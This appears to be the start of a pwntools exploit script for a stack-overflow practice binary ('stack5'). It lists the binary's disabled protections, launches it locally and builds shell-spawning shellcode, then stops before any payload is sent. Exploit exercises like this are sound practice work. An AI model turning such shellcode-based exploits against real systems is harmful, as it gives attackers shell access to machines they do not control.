from pwn import *

# 1. info
context.log_level = 'debug'
context.arch = 'amd64'
e = ELF("../stack5")
"""
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""

# 2. connect
p = process("../stack5")

# 3. exploit
shellcode = asm(shellcraft.sh())